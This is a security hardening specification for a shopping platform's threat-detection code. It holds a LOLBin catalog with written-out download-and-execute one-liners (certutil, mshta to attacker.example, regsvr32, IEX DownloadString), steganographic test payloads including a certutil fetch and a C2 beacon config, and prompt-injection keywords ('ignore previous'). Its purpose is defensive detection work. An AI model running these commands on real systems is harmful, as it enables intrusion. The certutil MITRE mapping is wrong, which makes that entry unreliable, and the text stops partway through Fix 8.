# ShopSquire Security Hardening — Codex / GPT-5 Fix Specification

**Version:** March 2026  
**Applies to:** `src/app/security/`, `frontend/src/components/DecisionTrace.tsx`  
**Purpose:** Exact file paths, line numbers, and replacement code for every gap identified across LOLBin behavioral enrichment, C2 steg credibility, ransomware-from-steg detection, PASTA stage accuracy, per-hypothesis decode-path, and Security Matrix tab UI fidelity.

---

## Table of Contents

1. [Fix 1 — Create `lolbin_behavioral_catalog.py`](#fix-1)
2. [Fix 2 — `email_security_rules.py`: LOLBin behavioral enrichment](#fix-2)
3. [Fix 3 — `passive_payload_analysis.py`: Content-only classification + per-hypothesis decode_path + ransomware steg signal](#fix-3)
4. [Fix 4 — `supply_chain_scenarios.py`: SC-04b agentic steg C2 scenario](#fix-4)
5. [Fix 5 — `escalation_room.py`: LOLBin context enrichment before incident creation](#fix-5)
6. [Fix 6 — `observer.py`: Fill PASTA stage gaps (ransomware, steg, cross-modal)](#fix-6)
7. [Fix 7 — Create `scripts/embed_steg_payload.py`](#fix-7)
8. [Fix 8 — `DecisionTrace.tsx`: Security Matrix tab — all UI gaps](#fix-8)
9. [Signal → PASTA / MITRE / Decode-Path / Payload-Type master correlation table](#correlation-table)

---

## Fix 1 — CREATE `src/app/security/lolbin_behavioral_catalog.py` {#fix-1}

**Why:** When a LOLBin fires, the incident message currently says only "Payload follow-up queued via incident `<id>`" with no explanation of *what the binary does*. Architects and CISOs expect per-binary behavioral context, MITRE sub-technique, abuse pattern, and detection note directly in the analyst response.

**File:** `src/app/security/lolbin_behavioral_catalog.py` — **new file, does not exist yet.**

```python
"""LOLBin behavioral catalog — per-binary attack descriptions for analyst enrichment.

Maps detected binary names to technique description, abuse patterns,
MITRE ATT&CK sub-technique, detection notes, and typical kill-chain stage.
All entries are factual, sourced from LOLBAS Project (lolbas-project.github.io)
and MITRE ATT&CK. Suitable for direct display in analyst consoles and incident tickets.
"""
from __future__ import annotations
from typing import Any, Dict, List

LOLBIN_CATALOG: Dict[str, Dict[str, Any]] = {
    "certutil": {
        "full_name": "certutil.exe",
        "mitre_sub_technique": "T1218.002",
        "mitre_technique_name": "System Binary Proxy Execution: Control Panel",
        "pasta_stage": "Stage4 — Exploitation",
        "description": (
            "Windows certificate management utility present on every modern Windows installation. "
            "Abused via '-urlcache -split -f <URL>' to download arbitrary files from "
            "internet-accessible URLs. The download bypasses many proxy inspection policies "
            "because certutil is a signed Microsoft binary. Also used to decode base64 content "
            "via '-decode' for multi-stage payload delivery."
        ),
        "abuse_patterns": [
            "certutil -urlcache -split -f <url> <output>  # remote file download",
            "certutil -decode encoded.txt decoded.exe     # base64 decode",
            "certutil -encode binary.exe encoded.txt      # base64 encode for exfiltration",
        ],
        "detection_note": (
            "Parent process spawning certutil with '-urlcache' or '-decode' is a strong "
            "indicator. Monitor for network connections initiated by certutil.exe. "
            "Legitimate uses are limited to certificate store management by sysadmins."
        ),
        "kill_chain_stage": "delivery/execution",
        "severity_weight": 0.80,
        "decode_path": "lolbin_command_decode",
    },
    "mshta": {
        "full_name": "mshta.exe",
        "mitre_sub_technique": "T1218.005",
        "mitre_technique_name": "System Binary Proxy Execution: Mshta",
        "pasta_stage": "Stage4 — Exploitation",
        "description": (
            "Microsoft HTML Application host that executes HTA files containing VBScript or "
            "JScript. Abused to execute remote script payloads via 'mshta https://attacker.example/evil.hta'. "
            "Bypasses PowerShell execution policies and AppLocker rules targeting .ps1 files. "
            "Frequently used as the second stage after a phishing email attachment is opened."
        ),
        "abuse_patterns": [
            "mshta https://<attacker>/payload.hta           # remote HTA execution",
            "mshta vbscript:Execute(\"CreateObject...\")(Window.Close)  # in-memory execution",
        ],
        "detection_note": (
            "mshta.exe making outbound HTTP/HTTPS connections is almost always malicious. "
            "Legitimate administrator use of mshta is extremely rare in modern environments."
        ),
        "kill_chain_stage": "execution",
        "severity_weight": 0.85,
        "decode_path": "lolbin_command_decode",
    },
    "rundll32": {
        "full_name": "rundll32.exe",
        "mitre_sub_technique": "T1218.011",
        "mitre_technique_name": "System Binary Proxy Execution: Rundll32",
        "pasta_stage": "Stage4 — Exploitation",
        "description": (
            "Windows DLL execution host abused to run JavaScript via 'rundll32 javascript:...' "
            "or to load arbitrary DLLs including remotely fetched ones. "
            "The 'rundll32 javascript:\"..\\mshtml,RunHTMLApplication\"' variant executes "
            "script directly in-memory without touching disk — classic fileless technique."
        ),
        "abuse_patterns": [
            "rundll32 javascript:\"..\\mshtml,RunHTMLApplication\";...  # in-memory JS execution",
            "rundll32 shell32.dll,ShellExec_RunDLL <payload>           # shell execution proxy",
        ],
        "detection_note": (
            "rundll32 invocations with 'javascript:' in the command line are a "
            "critical-severity indicator. Correlate with parent process and network connections."
        ),
        "kill_chain_stage": "execution/defense_evasion",
        "severity_weight": 0.85,
        "decode_path": "lolbin_command_decode",
    },
    "bitsadmin": {
        "full_name": "bitsadmin.exe",
        "mitre_sub_technique": "T1197",
        "mitre_technique_name": "BITS Jobs",
        "pasta_stage": "Stage3 — Decomposition / Threat Analysis",
        "description": (
            "Windows Background Intelligent Transfer Service administrator tool. "
            "Creates persistent BITS jobs that survive reboots and download files "
            "asynchronously in the background, evading real-time network monitoring. "
            "Persistence mechanism: BITS jobs are re-executed on reboot automatically."
        ),
        "abuse_patterns": [
            "bitsadmin /transfer job /download /priority normal <url> <dest>",
            "bitsadmin /create malicious; /addfile; /resume; /complete  # multi-step persistence",
        ],
        "detection_note": (
            "BITS jobs created by non-OS processes are anomalous. "
            "Check the BITS scheduled task queue and network connections from svchost."
        ),
        "kill_chain_stage": "persistence/delivery",
        "severity_weight": 0.75,
        "decode_path": "lolbin_command_decode",
    },
    "regsvr32": {
        "full_name": "regsvr32.exe",
        "mitre_sub_technique": "T1218.010",
        "mitre_technique_name": "System Binary Proxy Execution: Regsvr32",
        "pasta_stage": "Stage4 — Exploitation",
        "description": (
            "COM server registration utility. The 'Squiblydoo' technique uses "
            "'regsvr32 /s /n /u /i:<URL> scrobj.dll' to fetch and execute remote COM "
            "scriptlets over HTTP(S), bypassing AppLocker and application control policies. "
            "No child process is spawned — shellcode runs in the regsvr32 process context."
        ),
        "abuse_patterns": [
            "regsvr32 /s /n /u /i:https://<attacker>/payload.sct scrobj.dll  # Squiblydoo",
        ],
        "detection_note": (
            "regsvr32.exe network connections or loading remote SCT files is always malicious. "
            "Block regsvr32 from making outbound network calls via Windows Firewall."
        ),
        "kill_chain_stage": "execution/defense_evasion",
        "severity_weight": 0.80,
        "decode_path": "lolbin_command_decode",
    },
    "powershell": {
        "full_name": "powershell.exe",
        "mitre_sub_technique": "T1059.001",
        "mitre_technique_name": "Command and Scripting Interpreter: PowerShell",
        "pasta_stage": "Stage4 — Exploitation",
        "description": (
            "The '-EncodedCommand' / '-enc' flag accepts a Base64-encoded command string, "
            "commonly used to obfuscate malicious payloads and bypass script-based security "
            "controls. In-memory execution via 'Invoke-Expression' and 'IEX' leaves no "
            "script file on disk (fileless). '-WindowStyle Hidden' suppresses the console "
            "window to avoid detection by the user."
        ),
        "abuse_patterns": [
            "powershell -enc <base64>                             # encoded command obfuscation",
            "powershell -w hidden -enc <base64>                   # hidden window + encoding",
            "IEX (New-Object Net.WebClient).DownloadString(…)    # fileless download-execute",
        ],
        "detection_note": (
            "Base64-encoded PowerShell without a legitimate admin context is a high-severity "
            "indicator. Enable PowerShell Script Block Logging (Event ID 4104) and Transcript "
            "Logging to capture decoded commands."
        ),
        "kill_chain_stage": "execution/c2",
        "severity_weight": 0.82,
        "decode_path": "lolbin_command_decode",
    },
}


def enrich_lolbin_indicators(lolbin_hits: List[str]) -> List[Dict[str, Any]]:
    """Return per-binary behavioral profiles for a list of detected LOLBin names.

    Args:
        lolbin_hits: list of lowercase binary name strings from regex match groups,
                     e.g. ['certutil', 'powershell -enc']

    Returns:
        List of dicts, one per unique detected binary, each with full behavioral context
        including MITRE sub-technique, PASTA stage, abuse patterns, and detection notes.
    """
    out: List[Dict[str, Any]] = []
    seen: set[str] = set()
    for hit in lolbin_hits:
        key = str(hit or "").strip().lower()
        for catalog_key in LOLBIN_CATALOG:
            if key.startswith(catalog_key) and catalog_key not in seen:
                seen.add(catalog_key)
                entry = dict(LOLBIN_CATALOG[catalog_key])
                entry["detected_as"] = hit
                out.append(entry)
                break
    return out
```

---

## Fix 2 — EDIT `src/app/security/email_security_rules.py` {#fix-2}

### 2a — Add import at top of file (after existing imports block)

**File:** `src/app/security/email_security_rules.py`  
**After line 10** (after the `from src.app.rules.tenant_config_store import TenantConfigStore` line)

```python
from src.app.security.lolbin_behavioral_catalog import enrich_lolbin_indicators
```

### 2b — Replace the lolbin indicator block

**Find lines 714–726** (the lolbin_hits block, inside `extract_indicators()`):

**OLD:**
```python
    lolbin_hits = sorted({m.group(1).lower() for m in _LOLBINS_PAT.finditer(analysis_text)})
    if lolbin_hits:
        indicators.append({"type": "lolbin_command", "value": lolbin_hits, "reason": "Living-off-the-land binary pattern detected"})
        has_external_link = bool(re.search(r"https?://", analysis_text))
        has_risky_attachment = bool(suspicious_attachments(attachments))
        if has_external_link or has_risky_attachment:
            indicators.append(
                {
                    "type": "lolbin_delivery_combo",
                    "value": True,
                    "reason": "LOLBin command combined with external link/attachment",
                }
            )
```

**NEW:**
```python
    lolbin_hits = sorted({m.group(1).lower() for m in _LOLBINS_PAT.finditer(analysis_text)})
    if lolbin_hits:
        behavioral_profiles = enrich_lolbin_indicators(lolbin_hits)
        lolbin_reason = "; ".join(
            f"{p['full_name']} ({p['mitre_sub_technique']}): {p['description'][:160]}…"
            for p in behavioral_profiles
        ) or "Living-off-the-land binary pattern detected"
        indicators.append({
            "type": "lolbin_command",
            "value": lolbin_hits,
            "reason": lolbin_reason,
            "behavioral_profiles": behavioral_profiles,
            "pasta_stage": behavioral_profiles[0]["pasta_stage"] if behavioral_profiles else "Stage4 — Exploitation",
            "decode_path": "lolbin_command_decode",
        })
        has_external_link = bool(re.search(r"https?://", analysis_text))
        has_risky_attachment = bool(suspicious_attachments(attachments))
        if has_external_link or has_risky_attachment:
            indicators.append(
                {
                    "type": "lolbin_delivery_combo",
                    "value": True,
                    "reason": "LOLBin command combined with external link/attachment",
                }
            )
```

---

## Fix 3 — EDIT `src/app/security/passive_payload_analysis.py` {#fix-3}

This file has **three interconnected problems** fixed together:

1. **Filename leaks into content classifier** → hypothesis fires on filename (`steg-c2_beacon_simulation-...png`) not payload content
2. **`decode_path` is always `"safe_passive_decode_only"`** regardless of hypothesis
3. **Ransomware from steg images** is not wired: when steg decodes a payload containing ransomware keywords, `ransomware_indicator` signal is not set, so PASTA stays at Stage4 instead of Stage6

**File:** `src/app/security/passive_payload_analysis.py`

**Replace the entire file contents with:**

```python
from __future__ import annotations

from typing import Any, Dict, List


_HYPOTHESIS_TO_MITRE: Dict[str, List[str]] = {
    "lolbin_command_sequence": ["T1218", "T1059.001", "T1105"],
    "prompt_injection": ["AML.T0043", "T1566.002"],
    "data_exfiltration": ["T1041", "T1020"],
    "c2_beacon": ["T1071.001", "T1105", "T1573.002"],
    "payment_fraud": ["T1566.002", "T1204.001"],
    "ransomware": ["T1486", "T1059", "T1490"],
    "macros": ["T1566.001", "T1204.002", "T1059.005"],
    "steg_unknown_payload": ["T1027.001", "T1027"],
    "unknown": [],
}

# Maps each hypothesis to its PASTA threat-analysis stage
_HYPOTHESIS_TO_PASTA: Dict[str, str] = {
    "prompt_injection":       "Stage4 — Exploitation & Vulnerability Analysis",
    "ransomware":             "Stage6 — Attack Modeling",
    "macros":                 "Stage4 — Exploitation & Vulnerability Analysis",
    "payment_fraud":          "Stage5 — Weakness & Vulnerability Analysis",
    "lolbin_command_sequence":"Stage4 — Exploitation & Vulnerability Analysis",
    "data_exfiltration":      "Stage5 — Weakness & Vulnerability Analysis",
    "c2_beacon":              "Stage4 — Exploitation & Vulnerability Analysis",
    "steg_unknown_payload":   "Stage4 — Exploitation & Vulnerability Analysis",
    "unknown":                "Stage2 — Technical Scope Definition",
}

# Maps each hypothesis to a specific decode_path token understood by the analyst UI
_HYPOTHESIS_TO_DECODE_PATH: Dict[str, str] = {
    "prompt_injection":       "safe_passive_decode_only",
    "ransomware":             "sandbox_required_do_not_execute",
    "macros":                 "sandbox_required_do_not_execute",
    "payment_fraud":          "safe_passive_decode_only",
    "lolbin_command_sequence":"lolbin_command_decode",
    "data_exfiltration":      "safe_passive_decode_only",
    "c2_beacon":              "sandbox_required_do_not_execute",
    "steg_unknown_payload":   "safe_passive_decode_only",
    "unknown":                "safe_passive_decode_only",
}

# Human-readable labels for signal keys shown as raw booleans in the UI
SIGNAL_LABELS: Dict[str, str] = {
    "steg_suspicious":                  "Steganography Detected",
    "steg_score_elevated":              "Steg Score Elevated",
    "qr_code_detected":                 "QR Code Present",
    "qr_prompt_injection":              "QR Prompt Injection",
    "qr_external_url":                  "QR External URL",
    "qr_url_suspicious":                "QR URL Suspicious",
    "adversarial_detected":             "Adversarial Perturbation",
    "ai_generated_suspected":           "AI-Generated Image",
    "ransomware_indicator":             "Ransomware Pattern",
    "payment_social_engineering":       "Payment Social Engineering",
    "pci_card_exposed":                 "PCI Card Data Exposed",
    "crypto_payment_uri":               "Crypto Payment URI",
    "manipulation_detected":            "Image Manipulation",
    "image_consistency_mismatch":       "Image Consistency Mismatch",
    "ocr_prompt_injection":             "OCR Prompt Injection",
    "prompt_injection_text_suspected":  "Prompt Injection Text",
    "cross_modal_mismatch":             "Cross-Modal Mismatch",
    "multimodal_attack_surface_high":   "Multimodal Attack Surface High",
    "supply_chain":                     "Supply Chain Signal",
    "data_exfiltration":                "Data Exfiltration Pattern",
}


def _compact_text(*parts: Any) -> str:
    out: List[str] = []
    for part in parts:
        if isinstance(part, str) and part.strip():
            out.append(part.strip().lower())
        elif isinstance(part, list):
            out.extend(str(x).strip().lower() for x in part if str(x).strip())
        elif isinstance(part, dict):
            out.extend(f"{k}:{v}".strip().lower() for k, v in part.items() if str(v).strip())
    return " ".join(out)


def _contains_any(text: str, tokens: List[str]) -> bool:
    return any(tok in text for tok in tokens)


def classify_passive_payload(
    *,
    filename: str | None = None,
    extracted_text: str | None = None,
    signals: Dict[str, Any] | None = None,
) -> Dict[str, Any]:
    sigs = dict(signals or {})
    payloads = sigs.get("qr_payloads") if isinstance(sigs.get("qr_payloads"), list) else []
    steg_details = sigs.get("steg_details") if isinstance(sigs.get("steg_details"), dict) else {}
    steg_explanations = sigs.get("steg_explanations") if isinstance(sigs.get("steg_explanations"), list) else []

    # CRITICAL: hypothesis classification must be driven by payload CONTENT only, not by
    # the filename. The filename leaking into content_text causes false positives where
    # the hypothesis fires on file-naming conventions (e.g. "steg-c2_beacon-...png" → c2_beacon)
    # rather than on actual decoded content.
    content_text = _compact_text(extracted_text or "", payloads, steg_explanations, steg_details)

    # Filename is used ONLY for payload_type extension heuristics — never for hypothesis
    filename_lower = (filename or "").strip().lower()

    decoded_artifact_available = bool(payloads) or bool(str(extracted_text or "").strip()) or bool(steg_details)

    payload_type = "unknown"
    if payloads:
        payload_type = "qr"
    elif str(extracted_text or "").strip():
        payload_type = "embedded_text"
    elif steg_details:
        payload_type = "steg_metadata"
    elif filename_lower.endswith((".docm", ".xlsm", ".pptm", ".doc", ".xls", ".ppt")):
        payload_type = "office_macro_candidate"

    # Hypothesis — ALL checks against content_text, never filename
    hypothesis = "unknown"
    if sigs.get("qr_prompt_injection") or _contains_any(
        content_text, ["ignore previous", "system prompt", "developer message", "prompt injection"]
    ):
        hypothesis = "prompt_injection"
    elif sigs.get("ransomware_indicator") or _contains_any(
        content_text, ["ransom", "decrypt", "bitcoin", "unlock files", "pay within", "your files are encrypted"]
    ):
        hypothesis = "ransomware"
    elif _contains_any(content_text, ["macro", "vba", "enable content", "docm", "xlsm", "office macro"]):
        hypothesis = "macros"
    elif sigs.get("payment_social_engineering") or sigs.get("pci_card_exposed") or sigs.get("crypto_payment_uri"):
        hypothesis = "payment_fraud"
    elif _contains_any(
        content_text, ["lolbin", "powershell", "rundll32", "regsvr32", "mshta", "certutil", "wscript", "cscript", "bitsadmin"]
    ):
        hypothesis = "lolbin_command_sequence"
    elif _contains_any(
        content_text, ["exfil", "data exfiltration", "upload archive", "send archive", "exfiltrate", "upload to", "send to remote"]
    ):
        hypothesis = "data_exfiltration"
    elif _contains_any(
        content_text, ["c2", "beacon", "command and control", "check-in", "callback", "poll every", "heartbeat", "beacon:interval"]
    ):
        hypothesis = "c2_beacon"
    elif bool(sigs.get("steg_suspicious")) and not decoded_artifact_available:
        # Steg is flagged but no readable payload decoded — honest unknown
        hypothesis = "steg_unknown_payload"

    # Wire ransomware_indicator back into signals dict so PASTA logic in observer.py
    # and framework_correlation._pasta() can promote to Stage6.
    if hypothesis == "ransomware" and not sigs.get("ransomware_indicator"):
        sigs["ransomware_indicator"] = True

    mitre_attack = list(_HYPOTHESIS_TO_MITRE.get(hypothesis, []))
    pasta_stage = _HYPOTHESIS_TO_PASTA.get(hypothesis, "Stage2 — Technical Scope Definition")
    decode_path = _HYPOTHESIS_TO_DECODE_PATH.get(hypothesis, "safe_passive_decode_only")

    if hypothesis in {"lolbin_command_sequence", "c2_beacon", "ransomware", "macros", "steg_unknown_payload"} \
            or bool(sigs.get("steg_suspicious")):
        suggested_next_step = "queue_sandbox_detonation"
    elif hypothesis in {"prompt_injection", "data_exfiltration", "payment_fraud"} \
            or bool(sigs.get("steg_score_elevated")):
        suggested_next_step = "review"
    else:
        suggested_next_step = "allow"

    # Build per-binary behavioral profiles when hypothesis is lolbin
    lolbin_profiles: List[Dict[str, Any]] = []
    if hypothesis == "lolbin_command_sequence":
        try:
            from src.app.security.lolbin_behavioral_catalog import enrich_lolbin_indicators, LOLBIN_CATALOG
            detected = [k for k in LOLBIN_CATALOG if k in content_text]
            lolbin_profiles = enrich_lolbin_indicators(detected)
        except Exception:
            pass

    return {
        "decoded_artifact_available": bool(decoded_artifact_available),
        "payload_type": payload_type,
        "attack_hypothesis": hypothesis,
        "mitre_attack": mitre_attack,
        "pasta_stage": pasta_stage,
        "decode_path": decode_path,
        "suggested_next_step": suggested_next_step,
        "lolbin_behavioral_profiles": lolbin_profiles,
        "signals_updated": sigs,  # returned so callers have access to ransomware_indicator injection
    }
```

---

## Fix 4 — EDIT `src/app/security/supply_chain_scenarios.py` {#fix-4}

**File:** `src/app/security/supply_chain_scenarios.py`  
**Location:** After `sc04_c2_beaconing()` definition (approximately line 194)  
**Action:** Insert new function before `sc05_lolbin_abuse`

```python
def sc04b_c2_steg_image_channel() -> Dict[str, Any]:
    """SC-04b: C2 instructions delivered via LSB steganography in product image submissions.

    Threat model: adversary submits catalog/returns images with LSB-encoded C2 polling
    instructions that target the AI vision processing pipeline directly.
    This is the agentic-AI-specific C2 channel not covered by network XDR platforms
    (Darktrace, ExtraHop, Cortex XDR) because it requires visibility into the vision
    inference pipeline, not the network layer.
    """
    return {
        "scenario_id": "SC-04b",
        "name": "C2 via Image Steganography (Agentic AI Pipeline)",
        "mitre_attack": ["T1027.001", "T1071.001", "T1573.002"],
        "owasp_tags": ["ASI07:InsecureInterAgentComms", "LLM05:SupplyChainVulnerabilities"],
        "kill_chain": ["delivery", "command_and_control"],
        "pasta_stage": "Stage4 — Exploitation & Vulnerability Analysis",
        "payload": {
            "event_type": "steg_c2_channel",
            "carrier": "product_catalog_image_upload",
            # Inert RFC-5737/RFC-2606 only — no real IPs or domains
            "decoded_payload": "c2_beacon:interval=60:jitter=0.15:dst=203.0.113.99:domain=c2.example.com",
            "encoding": "lsb_green_channel",
            "estimated_capacity_pct": 0.08,
            "steg_tool": "custom_lsb_encoder",
            "steg_score": 0.67,
            "detection_signals": [
                "lsb_entropy_elevated",
                "chi_square_uniformity_high",
                "spa_capacity_estimate_positive",
            ],
        },
        "expected_signals": ["c2_beacon", "steg_unknown_payload"],
        "expected_severity": "high",
        "human_escalation_expected": True,
        "description": (
            "An adversary uploads a product image with C2 polling instructions encoded in "
            "the green channel LSBs. The steg detector flags elevated entropy and chi-square "
            "uniformity; passive decode extracts the beacon configuration targeting a TEST-NET-3 "
            "IP (RFC-5737). This scenario is specific to agentic AI platforms — traditional "
            "network XDR has no visibility into vision-pipeline-borne C2 channels."
        ),
    }
```

---

## Fix 5 — EDIT `src/app/routers/escalation_room.py` {#fix-5}

**File:** `src/app/routers/escalation_room.py`  
**Location:** `public_escalate()` function body (line ~1438)

**Find the function body:**
```python
@public_router.post("/escalate", response_model=IncidentEscalateResponse)
def public_escalate(body: EscalateRequest, request: Request) -> Dict:
    """Create an incident + issue buyer/staff chat tokens (local-dev demo only).

    In production this should be bound to an authenticated user session.
    """
    if not _allow_public_escalation(request):
        raise HTTPException(status_code=403, detail="public_escalation_disabled")
    return create_incident_record(
        case_id=body.case_id,
        trace_id=body.trace_id,
        reason=body.reason,
        context=body.context,
        created_by="buyer",
        severity="warn",
        title="Buyer escalation: human review requested",
        dedupe_by_event=True,
    )
```

**Replace with:**
```python
@public_router.post("/escalate", response_model=IncidentEscalateResponse)
def public_escalate(body: EscalateRequest, request: Request) -> Dict:
    """Create an incident + issue buyer/staff chat tokens (local-dev demo only).

    In production this should be bound to an authenticated user session.
    """
    if not _allow_public_escalation(request):
        raise HTTPException(status_code=403, detail="public_escalation_disabled")

    # Enrich LOLBin behavioral context before creating the incident record so that
    # the analyst response includes per-binary descriptions, not just an incident ID.
    enriched_context = dict(body.context or {})
    sec_payload = dict(enriched_context.get("security_payload") or {})
    hypothesis = str(sec_payload.get("attack_hypothesis") or "")
    if hypothesis == "lolbin_command_sequence":
        try:
            from src.app.security.lolbin_behavioral_catalog import (
                enrich_lolbin_indicators,
                LOLBIN_CATALOG,
            )
            extracted = str(enriched_context.get("extracted_text") or "").lower()
            # Use already-computed profiles if available, otherwise re-detect from text
            existing = [
                str(p.get("detected_as") or "")
                for p in (sec_payload.get("lolbin_behavioral_profiles") or [])
                if p.get("detected_as")
            ]
            detected = existing or [k for k in LOLBIN_CATALOG if k in extracted]
            if detected:
                profiles = enrich_lolbin_indicators(detected)
                enriched_context["lolbin_behavioral_profiles"] = profiles
                enriched_context["lolbin_summary"] = "; ".join(
                    f"{p['full_name']} ({p['mitre_sub_technique']}): {p['description'][:120]}…"
                    for p in profiles
                )
        except Exception:
            pass

    updated_body = body.model_copy(update={"context": enriched_context})
    return create_incident_record(
        case_id=updated_body.case_id,
        trace_id=updated_body.trace_id,
        reason=updated_body.reason,
        context=updated_body.context,
        created_by="buyer",
        severity="warn",
        title="Buyer escalation: human review requested",
        dedupe_by_event=True,
    )
```

---

## Fix 6 — EDIT `src/app/security/observer.py` (PASTA stage gaps) {#fix-6}

**Background:** `observer.py` has its own PASTA stage computation that diverges from `framework_correlation._pasta()`. It is missing:
- `ransomware_indicator` → Stage6
- `steg_suspicious` / `steg_score_elevated` → Stage4
- `cross_modal_mismatch` / `pci_card_exposed` → Stage5

**File:** `src/app/security/observer.py`  
**Find the PASTA computation block** (approximately lines 712–760). The block looks like:

```python
        # build pasta stages
        stages = [...]
        if signals_dict.get("supply_chain") or signals_dict.get("training_poisoning"):
            current_stage = "Stage3"
        if signals_dict.get("jailbreak") or signals_dict.get("prompt_injection") or signals_dict.get("agentic_tool_abuse"):
            current_stage = "Stage4"
        ...
```

**After the existing `if severity in ("high", "critical"):` line that sets Stage6, add:**

```python
        # Fill observer.py PASTA gaps to match framework_correlation._pasta() behaviour
        if signals_dict.get("steg_suspicious") or signals_dict.get("steg_score_elevated"):
            if current_stage_num < 4:
                current_stage = "Stage4"
        if signals_dict.get("cross_modal_mismatch") or signals_dict.get("pci_card_exposed") \
                or signals_dict.get("multimodal_attack_surface_high"):
            if current_stage_num < 5:
                current_stage = "Stage5"
        if signals_dict.get("ransomware_indicator"):
            current_stage = "Stage6"
```

> **Note:** The exact line numbers in `observer.py` require reading the file first. The pattern to find is the PASTA `current_stage` assignment block inside `compute_risk()` or the equivalent method. The logic above should be inserted as the last set of overrides before the PASTA dict is assembled.

---

## Fix 7 — CREATE `scripts/embed_steg_payload.py` {#fix-7}

**Purpose:** Regenerate test images so the steg payload contains actual keyword content (e.g. `c2_beacon:interval=60`) that drives the content-based classifier rather than relying on the filename.

```python
"""
Embed a text payload into an image's LSBs for security simulation test images.

Usage:
    python scripts/embed_steg_payload.py \
        --input dump/test-cv/macbook-base.png \
        --output dump/test-sec/steg-c2_beacon_simulation-apple-mac.png \
        --payload "c2_beacon:interval=60:jitter=0.15:dst=203.0.113.99:domain=c2.example.com"

    python scripts/embed_steg_payload.py \
        --input dump/test-cv/macbook-base.png \
        --output dump/test-sec/steg-lolbin_command_sequence-Macbook_Air_15.png \
        --payload "certutil -urlcache -split -f https://dl.example.com/payload.bin payload.bin"

    python scripts/embed_steg_payload.py \
        --input dump/test-cv/macbook-base.png \
        --output dump/test-sec/steg-ransomware-apple-mac.png \
        --payload "your files are encrypted pay bitcoin within 72 hours for decryption key"

IMPORTANT:
  - Only use with synthetic/test images. Never use with real product photos.
  - ALL destination IPs MUST be RFC-5737 (203.0.113.x) reserved.
  - ALL domains MUST be RFC-2606 (.example.com / .invalid / .test).
"""
import argparse
import sys
from pathlib import Path

# Disallowed tokens — prevent accidental use of real infrastructure references
_BLOCKED_TOKENS = [
    "evil", "attacker", "malicious", "real-c2", "keylogger",
]
# Allowed safe suffixes for domains in payloads
_SAFE_DOMAIN_SUFFIXES = (".example.com", ".example", ".invalid", ".test", ".localhost")
# Allowed IP prefix for test network (RFC-5737 TEST-NET-3)
_SAFE_IP_PREFIX = "203.0.113."


def _validate_payload(payload: str) -> None:
    low = payload.lower()
    for tok in _BLOCKED_TOKENS:
        if tok in low:
            print(f"[BLOCKED] Payload contains disallowed token '{tok}'. "
                  f"Use RFC-2606/RFC-5737 reserved strings only.")
            sys.exit(1)
    import re
    # Check any IP addresses present are in safe range
    for ip in re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", payload):
        if not ip.startswith(_SAFE_IP_PREFIX) and not ip.startswith("127.") and ip != "0.0.0.0":
            print(f"[BLOCKED] IP {ip} is not in RFC-5737 TEST-NET-3 (203.0.113.x). "
                  f"Use 203.0.113.x IPs only.")
            sys.exit(1)
    # Check any domains are in safe suffixes
    for domain in re.findall(r"\b(?:[a-z0-9-]+\.)+[a-z]{2,}\b", low):
        if "." in domain and not any(domain.endswith(s) for s in _SAFE_DOMAIN_SUFFIXES):
            print(f"[WARNING] Domain '{domain}' may not be a reserved test domain. "
                  f"Use .example.com, .invalid, or .test suffixes.")


def embed_lsb(image_path: str, output_path: str, payload: str) -> None:
    try:
        from PIL import Image
        import numpy as np
    except ImportError:
        print("Requires Pillow and numpy: pip install Pillow numpy")
        sys.exit(1)

    img = Image.open(image_path).convert("RGB")
    arr = np.array(img, dtype=np.uint8)
    h, w, c = arr.shape
    payload_bytes = payload.encode("utf-8") + b"\x00"  # null-terminate
    n_bits = len(payload_bytes) * 8
    if n_bits > h * w * c:
        print(f"Payload too large: need {n_bits} bits, image has {h * w * c} available.")
        sys.exit(1)
    flat = arr.flatten()
    for bit_idx in range(n_bits):
        byte_i = bit_idx // 8
        bit_i = 7 - (bit_idx % 8)
        bit = (payload_bytes[byte_i] >> bit_i) & 1
        flat[bit_idx] = (flat[bit_idx] & 0xFE) | bit
    result = flat.reshape(h, w, c).astype(np.uint8)
    Image.fromarray(result).save(output_path)
    print(f"[OK] Embedded {len(payload_bytes)} bytes → {output_path}")
    print(f"     Payload: {payload[:80]}{'…' if len(payload) > 80 else ''}")


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="Embed inert test payload into image LSBs")
    p.add_argument("--input", required=True, help="Source image path")
    p.add_argument("--output", required=True, help="Output steg image path")
    p.add_argument("--payload", required=True, help="Text payload to embed (RFC-2606/5737 safe only)")
    args = p.parse_args()
    _validate_payload(args.payload)
    embed_lsb(args.input, args.output, args.payload)
```

**After creating the script, regenerate all three test images:**
```powershell
# C2 beacon
python scripts/embed_steg_payload.py `
  --input dump/test-cv/macbook-base.png `
  --output "dump/test-sec/steg-c2_beacon_simulation-apple-mac.png" `
  --payload "c2_beacon:interval=60:jitter=0.15:dst=203.0.113.99:domain=c2.example.com"

# LOLBin
python scripts/embed_steg_payload.py `
  --input dump/test-cv/macbook-base.png `
  --output "dump/test-sec/steg-lolbin_command_sequence-Macbook_Air_15_inch_-_2__blurred_.png" `
  --payload "certutil -urlcache -split -f https://dl.example.com/payload.bin payload.bin"

# Ransomware
python scripts/embed_steg_payload.py `
  --input dump/test-cv/macbook-base.png `
  --output "dump/test-sec/steg-ransomware-apple-mac.png" `
  --payload "your files are encrypted pay bitcoin within 72 hours for decryption key contact decrypt@example.invalid"
```

---

## Fix 8 — EDIT `frontend/src/components/DecisionTrace.tsx` {#fix-8}

### 8a — `buildTriageNarrative()` — add ransomware + per-hypothesis PASTA + decode_path branches

**Location:** `buildTriageNarrative()` function (~lines 733–765)

**Find the end of the narrative function — the steg branch and the fallback:**
```tsx
    } else if (sigs.steg_suspicious) {
      parts.push(`Steganography anomaly detected (score: ${sigs.steg_score ?? '?'}); metadata may be hiding a payload.`);
    }

    const ocrText = (t?.security?.extracted_text || ...
```

**Replace only the steg branch + add additional branches before the `ocrText` line:**
```tsx
    } else if (sigs.steg_suspicious) {
      parts.push(`Steganography anomaly detected (score: ${sigs.steg_score ?? '?'}); image may carry a hidden payload.`);
    }

    // Ransomware from steg — explicit branch so analyst sees clear narrative
    if (sigs.ransomware_indicator || payloadAnalysis.attack_hypothesis === 'ransomware') {
      parts.push(
        `Ransomware pattern detected. MITRE T1486 (Data Encrypted for Impact) / T1490 (Inhibit System Recovery). ` +
        `Decode path: ${payloadAnalysis.decode_path || 'sandbox_required_do_not_execute'}. ` +
        `Do NOT execute payload — queue sandbox detonation.`
      );
    }

